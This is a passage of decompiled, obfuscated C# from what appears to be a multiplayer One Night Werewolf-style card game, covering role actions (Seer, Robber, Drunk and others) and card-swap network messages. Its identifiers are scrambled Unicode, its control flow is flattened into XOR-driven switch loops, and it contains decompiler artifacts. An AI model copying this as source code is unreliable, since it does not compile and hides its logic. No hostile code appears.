        int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(10);
        int num2 = -10;
        while (true)
        {
          switch ((num2 ^ 58) + 55)
          {
            case 0:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46D);
              num2 = -13;
              continue;
            case 1:
              switch (num1 + 56)
              {
                case 0:
                  this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49C(_param1);
                  num1 = -2;
                  goto label_2;
                case 1:
                  num1 = -6;
                  goto label_2;
                case 2:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_VoteMenuButton);
                  num1 = -3;
                  goto label_2;
                case 3:
                  num1 = -5;
                  goto label_2;
                case 4:
                  checked { ++this.CardCount; }
                  num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(7);
                  goto label_2;
                case 5:
                  goto label_14;
                default:
                  num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(27);
                  continue;
              }
            case 2:
              goto label_8;
            case 3:
label_2:
              num1 ^= 55;
              break;
          }
          num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(31);
        }
      }
label_14:
      if ((this.CardCount != 2 ? 1 : 0) != 0)
        return;
      this.SawCard = true;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF471(
      int _param1)
    {
      if ((!(this.InitialRole.Equals("Seer") & !this.SawCard & this.TurnAllowed) ? 1 : 0) != 0)
        return;
      \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uEB7F\uF247\uE858\uF5C7\uEC2A\uECFA\uEDD9\uE261\uF6B8\uF56C\uEBA5\uF443.Audio.PlaySystemSound(SystemSounds.Beep);
label_6:
      int num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(32);
      int num2 = 116;
      while (true)
      {
        switch (num2 ^ 54)
        {
          case 63:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.set_SendButton);
            num2 = 9;
            continue;
          case 64:
            goto label_6;
          case 65:
            switch (num1 + 61)
            {
              case 0:
                this.SawCard = true;
                num1 = -14;
                goto label_2;
              case 1:
                num1 = -12;
                goto label_2;
              case 2:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49B(_param1);
                num1 = -15;
                goto label_2;
              case 3:
                num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(7);
                goto label_2;
              case 4:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_VoteMenuButton);
                num1 = -16;
                goto label_2;
              case 5:
                goto label_15;
              default:
                num2 = 118;
                continue;
            }
          case 66:
label_2:
            num1 ^= 55;
            break;
        }
        num2 = 119;
      }
label_15:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF472(
      int _param1)
    {
      if ((!(this.InitialRole.Equals("Insomniac") & !this.SawCard & this.TurnAllowed) ? 1 : 0) != 0)
        return;
      \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uEB7F\uF247\uE858\uF5C7\uEC2A\uECFA\uEDD9\uE261\uF6B8\uF56C\uEBA5\uF443.Audio.PlaySystemSound(SystemSounds.Beep);
label_8:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(11);
      int num2 = -11;
      while (true)
      {
        switch ((num2 ^ 61) + 59)
        {
          case 0:
            switch (num1 + 60)
            {
              case 0:
                this.SawCard = true;
                num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(8);
                goto label_2;
              case 1:
                num1 = -10;
                goto label_2;
              case 2:
                num1 = -5;
                goto label_2;
              case 3:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46B);
                num1 = -8;
                goto label_2;
              case 4:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49B(_param1);
                num1 = -6;
                goto label_2;
              case 5:
                goto label_15;
              default:
                num2 = -6;
                continue;
            }
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF476);
            num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(30);
            continue;
          case 2:
            goto label_8;
          case 3:
label_2:
            num1 ^= 63;
            break;
        }
        num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(5);
      }
label_15:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF473(
      int _param1)
    {
      if ((!(this.InitialRole.Equals("Robber") & this.TurnAllowed) ? 1 : 0) != 0)
        return;
      \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uEB7F\uF247\uE858\uF5C7\uEC2A\uECFA\uEDD9\uE261\uF6B8\uF56C\uEBA5\uF443.Audio.PlaySystemSound(SystemSounds.Beep);
label_8:
      int num1 = 3;
      int num2 = 118;
      while (true)
      {
        switch (num2 ^ 54)
        {
          case 61:
            byte[] bytes;
            switch (num1)
            {
              case 57:
                this.TurnAllowed = false;
                num1 = (int) sbyte.MaxValue;
                goto label_2;
              case 58:
                bytes = Encoding.ASCII.GetBytes(this.PlayerList[_param1].GetCardType + "<>" + this.PlayerList[_param1].GetUniquePlayerID + "<>" + this.thisPlayer.GetCardType + "<>" + this.thisPlayer.GetUniquePlayerID + "<>PlayerSwap");
                num1 = 124;
                goto label_2;
              case 59:
                num1 = 6;
                goto label_2;
              case 60:
                this.PlayerList[_param1].SetPlayerCardType(this.thisPlayer.GetCardType);
                num1 = 1;
                goto label_2;
              case 61:
                num1 = 125;
                goto label_2;
              case 62:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.get_Card3);
                num1 = 2;
                goto label_2;
              case 63:
                num1 = 5;
                goto label_2;
              case 64:
                this.sendingUpdateCardChanges.Send(bytes, bytes.Length);
                num1 = 121;
                goto label_2;
              case 65:
                this.thisPlayer.SetPlayerCardType(this.RobbersNewRole);
                num1 = 7;
                goto label_2;
              case 66:
                this.RobbersNewRole = this.PlayerList[_param1].GetCardType;
                num1 = 0;
                goto label_2;
              case 67:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49B(_param1);
                num1 = 120;
                goto label_2;
              case 68:
                num1 = 126;
                goto label_2;
              case 69:
                goto label_22;
              default:
                num2 = 9;
                continue;
            }
          case 62:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.set_GameTime);
            num2 = 8;
            continue;
          case 63:
            goto label_8;
          case 64:
label_2:
            num1 ^= 60;
            break;
        }
        num2 = 11;
      }
label_22:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF474(
      int _param1)
    {
      if ((!(this.InitialRole.Equals("TroubleMaker") & this.TurnAllowed) ? 1 : 0) != 0)
        return;
      \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uEB7F\uF247\uE858\uF5C7\uEC2A\uECFA\uEDD9\uE261\uF6B8\uF56C\uEBA5\uF443.Audio.PlaySystemSound(SystemSounds.Beep);
label_3:
      int num1 = 120;
      bool flag;
      while (true)
      {
        switch (num1 ^ 56)
        {
          case 63:
            flag = Operators.ConditionalCompareObjectGreater(this.TMFirstPickIndex, (object) 0, false);
            num1 = 121;
            continue;
          case 64:
            num1 = 7;
            continue;
          case 65:
            if (flag)
            {
              num1 = 123;
              continue;
            }
            goto label_10;
          case 66:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF485);
            num1 = 122;
            continue;
          case 67:
            goto label_9;
          default:
            goto label_3;
        }
      }
label_9:
      int num2 = 0;
      goto label_11;
label_10:
      num2 = 1;
label_11:
      if (num2 == 0)
      {
        this.TurnAllowed = false;
label_14:
        int num3 = 121;
        object getCardType;
        byte[] bytes;
        while (true)
        {
          switch (num3 ^ 56)
          {
            case 63:
              this.PlayerList[Conversions.ToInteger(this.TMFirstPickIndex)].SetPlayerCardType(Conversions.ToString(getCardType));
              num3 = 123;
              continue;
            case 64:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_Card8);
              num3 = 120;
              continue;
            case 65:
              getCardType = (object) this.PlayerList[_param1].GetCardType;
              num3 = 122;
              continue;
            case 66:
              this.PlayerList[_param1].SetPlayerCardType(this.PlayerList[Conversions.ToInteger(this.TMFirstPickIndex)].GetCardType);
              num3 = 125;
              continue;
            case 67:
              num3 = 126;
              continue;
            case 68:
              this.sendingUpdateCardChanges.Send(bytes, bytes.Length);
              num3 = (int) sbyte.MaxValue;
              continue;
            case 69:
              num3 = 7;
              continue;
            case 70:
              bytes = Encoding.ASCII.GetBytes(this.PlayerList[_param1].GetCardType + "<>" + this.PlayerList[_param1].GetUniquePlayerID + "<>" + this.PlayerList[Conversions.ToInteger(this.TMFirstPickIndex)].GetCardType + "<>" + this.PlayerList[Conversions.ToInteger(this.TMFirstPickIndex)].GetUniquePlayerID + "<>PlayerSwap");
              num3 = 124;
              continue;
            case 71:
              goto label_23;
            default:
              goto label_14;
          }
        }
      }
label_23:
      this.TMFirstPickIndex = (object) _param1;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF475(
      int _param1)
    {
      if ((!(this.InitialRole.Equals("Drunk") & this.TurnAllowed) ? 1 : 0) != 0)
        return;
      \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uEB7F\uF247\uE858\uF5C7\uEC2A\uECFA\uEDD9\uE261\uF6B8\uF56C\uEBA5\uF443.Audio.PlaySystemSound(SystemSounds.Beep);
label_5:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(27);
      int num2 = -9;
      while (true)
      {
        switch ((num2 ^ 58) + 54)
        {
          case 0:
            goto label_5;
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF492);
            num2 = -15;
            continue;
          case 2:
            byte[] bytes;
            switch (num1 + 56)
            {
              case 0:
                bytes = Encoding.ASCII.GetBytes(this.MiddleCardsList[_param1].ToString() + "<>" + _param1.ToString() + "<>" + this.thisPlayer.GetCardType + "<>" + this.thisPlayer.GetUniquePlayerID + "<>MiddleSwap");
                num1 = -13;
                goto label_2;
              case 1:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF472);
                num1 = -11;
                goto label_2;
              case 2:
                num1 = -12;
                goto label_2;
              case 3:
                num1 = -20;
                goto label_2;
              case 4:
                this.TurnAllowed = false;
                num1 = -19;
                goto label_2;
              case 5:
                num1 = -16;
                goto label_2;
              case 6:
                this.MiddleCardsList[_param1] = this.thisPlayer.GetCardType;
                num1 = -9;
                goto label_2;
              case 7:
                this.sendingUpdateCardChanges.Send(bytes, bytes.Length);
                num1 = -18;
                goto label_2;
              case 8:
                this.thisPlayer.SetPlayerCardType(this.DrunksNewRole);
                num1 = -10;
                goto label_2;
              case 9:
                this.DrunksNewRole = this.MiddleCardsList[_param1];
                num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(12);
                goto label_2;
              case 10:
                goto label_20;
              default:
                num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(31);
                continue;
            }
          case 3:
label_2:
            num1 ^= 60;
            break;
        }
        num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(13);
      }
label_20:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF476(
      object _param1,
      EventArgs _param2)
    {
label_4:
      int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(10);
      int num2 = 2;
      while (true)
      {
        switch (num2 ^ 60)
        {
          case 59:
            goto label_4;
          case 60:
            switch (num1 + 57)
            {
              case 0:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF470(0);
                num1 = -5;
                goto label_1;
              case 1:
                num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(27);
                goto label_1;
              case 2:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF475(0);
                num1 = -3;
                goto label_1;
              case 3:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46F(0);
                num1 = -2;
                goto label_1;
              case 4:
                num1 = -8;
                goto label_1;
              case 5:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47B);
                num1 = -6;
                goto label_1;
              case 6:
                num1 = -1;
                goto label_1;
              case 7:
                goto label_12;
              default:
                num2 = 7;
                continue;
            }
          case 61:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF487);
            num2 = 1;
            continue;
          case 62:
label_1:
            num1 ^= 54;
            break;
        }
        num2 = 0;
      }
label_12:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF477(
      object _param1,
      EventArgs _param2)
    {
label_7:
      int num1 = 5;
      int num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(31);
      while (true)
      {
        switch ((num2 ^ 59) + 56)
        {
          case 0:
            switch (num1)
            {
              case 54:
                num1 = 3;
                goto label_1;
              case 55:
                num1 = 0;
                goto label_1;
              case 56:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49E);
                num1 = 1;
                goto label_1;
              case 57:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF475(1);
                num1 = 2;
                goto label_1;
              case 58:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF470(1);
                num1 = 14;
                goto label_1;
              case 59:
                num1 = 4;
                goto label_1;
              case 60:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46F(1);
                num1 = 15;
                goto label_1;
              case 61:
                goto label_13;
              default:
                num2 = -15;
                continue;
            }
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_PlayerName9);
            num2 = -14;
            continue;
          case 2:
            goto label_7;
          case 3:
label_1:
            num1 ^= 57;
            break;
        }
        num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(32);
      }
label_13:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF478(
      object _param1,
      EventArgs _param2)
    {
label_6:
      int num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(25);
      int num2 = -11;
      while (true)
      {
        switch ((num2 ^ 60) + 58)
        {
          case 0:
            switch (num1 + 56)
            {
              case 0:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF470(2);
                num1 = -13;
                goto label_1;
              case 1:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF475(2);
                num1 = -12;
                goto label_1;
              case 2:
                num1 = -16;
                goto label_1;
              case 3:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.get_PlayerName9);
                num1 = -14;
                goto label_1;
              case 4:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46F(2);
                num1 = -9;
                goto label_1;
              case 5:
                num1 = -10;
                goto label_1;
              case 6:
                num1 = -15;
                goto label_1;
              case 7:
                goto label_12;
              default:
                num2 = -5;
                continue;
            }
          case 1:
            goto label_6;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.set_PlayerName5);
            num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(40);
            continue;
          case 3:
label_1:
            num1 ^= 57;
            break;
        }
        num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(9);
      }
label_12:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF479(
      object _param1,
      EventArgs _param2)
    {
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF481(8);
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47A(
      object _param1,
      EventArgs _param2)
    {
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF481(7);
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47B(
      object _param1,
      EventArgs _param2)
    {
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF481(6);
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47C(
      object _param1,
      EventArgs _param2)
    {
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF481(5);
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47D(
      object _param1,
      EventArgs _param2)
    {
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF481(4);
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47E(
      object _param1,
      EventArgs _param2)
    {
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF481(3);
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47F(
      object _param1,
      EventArgs _param2)
    {
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF481(2);
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF480(
      object _param1,
      EventArgs _param2)
    {
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF481(1);
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF481(
      int _param1)
    {
label_4:
      int num1 = 5;
      int num2 = -2;
      while (true)
      {
        switch ((num2 ^ 57) + 60)
        {
          case 0:
            goto label_4;
          case 1:
            switch (num1)
            {
              case 58:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF471(_param1);
                num1 = 4;
                goto label_1;
              case 59:
                num1 = 0;
                goto label_1;
              case 60:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.set_Card9);
                num1 = 3;
                goto label_1;
              case 61:
                num1 = 1;
                goto label_1;
              case 62:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF474(_param1);
                num1 = (int) sbyte.MaxValue;
                goto label_1;
              case 63:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF473(_param1);
                num1 = 2;
                goto label_1;
              case 64:
                num1 = 126;
                goto label_1;
              case 65:
                goto label_13;
              default:
                num2 = -3;
                continue;
            }
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.set_CardInfoButton);
            num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(7);
            continue;
          case 3:
label_1:
            num1 ^= 63;
            break;
        }
        num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(10);
      }
label_13:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF482(
      object _param1,
      EventArgs _param2)
    {
label_7:
      int num1 = 118;
      int num2 = -15;
      while (true)
      {
        switch ((num2 ^ 56) + 58)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.set_SendButton);
            num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(43);
            continue;
          case 1:
            switch (num1)
            {
              case 61:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF482);
                num1 = 11;
                goto label_1;
              case 62:
                num1 = 119;
                goto label_1;
              case 63:
                num1 = 116;
                goto label_1;
              case 64:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF472(0);
                num1 = 8;
                goto label_1;
              case 65:
                Interaction.Beep();
                num1 = 9;
                goto label_1;
              case 66:
                goto label_9;
              default:
                num2 = -16;
                continue;
            }
          case 2:
            goto label_7;
          case 3:
label_1:
            num1 ^= 54;
            break;
        }
        num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(7);
      }
label_9:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF483(
      object _param1,
      EventArgs _param2)
    {
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF484(
      object _param1,
      EventArgs _param2)
    {
label_5:
      int num1 = 1;
      int num2 = 0;
      while (true)
      {
        switch (num2 ^ 61)
        {
          case 58:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49E);
            num2 = 7;
            continue;
          case 59:
            goto label_5;
          case 60:
            SettingsForm settingsForm;
            switch (num1)
            {
              case 59:
                this.Settings.Enabled = false;
                num1 = 0;
                goto label_1;
              case 60:
                num1 = (int) sbyte.MaxValue;
                goto label_1;
              case 61:
                settingsForm = new SettingsForm(this.thisPlayer);
                num1 = 125;
                goto label_1;
              case 62:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF487);
                num1 = 2;
                goto label_1;
              case 63:
                num1 = 124;
                goto label_1;
              case 64:
                settingsForm.Show();
                num1 = 126;
                goto label_1;
              case 65:
                settingsForm.Text = "Game Settings";
                num1 = 3;
                goto label_1;
              case 66:
                num1 = 7;
                goto label_1;
              case 67:
                goto label_14;
              default:
                num2 = 6;
                continue;
            }
          case 61:
label_1:
            num1 ^= 60;
            break;
        }
        num2 = 1;
      }
label_14:;
    }

    public void UpdateSettings(bool audio)
